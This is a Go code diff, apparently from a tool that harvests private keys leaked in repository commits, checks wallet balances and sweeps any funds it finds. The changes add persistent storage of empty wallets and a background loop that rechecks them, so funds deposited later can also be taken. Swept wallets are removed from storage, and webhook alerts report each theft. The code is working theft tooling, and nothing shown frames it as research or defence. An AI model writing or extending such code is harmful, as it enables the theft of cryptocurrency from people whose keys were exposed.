@@ -240,6 +240,9 @@ func run(cfg *Config) error {
 		go commitWorker(ctx, monitor, commitJobs, foundKeys, cfg.VerifyOnline)
 	}
 
+	loadStoredWallets()
+	go recheckLoop(ctx, cfg)
+
 	for {
 		select {
 		case <-ctx.Done():
@@ -346,11 +349,13 @@ func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
 		}
 	}
 
+	anyFunds := false
 	for _, b := range balances {
 		logBalance(b, key)
 		if !b.HasFunds {
 			continue
 		}
+		anyFunds = true
 		if skipTokens && (b.Chain == "USDC" || b.Chain == "USDT") {
 			logger.Printf("[sweep] skipping %s sweep — no gas available", b.Chain)
 			continue
@@ -363,6 +368,14 @@ func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
 			notify(ctx, key, b, cfg.WebhookURL)
 		}
 		sweep(ctx, key, b, addrs, cfg)
+	}
+
+	if !anyFunds && key.Raw != "" && key.Repo != "recheck" {
+		ethAddr := ""
+		if addrs.ETH != "" {
+			ethAddr = addrs.ETH
+		}
+		addStoredWallet(key, ethAddr)
 	}
 }
 
@@ -469,4 +482,5 @@ func sweep(ctx context.Context, key FoundKey, b BalanceResult, addrs DerivedAddr
 	if cfg.WebhookURL != "" {
 		notifySwept(ctx, key, b, txHash, "", cfg.WebhookURL)
 	}
+	removeStoredWallet(key.Raw, key.Chain)
 }
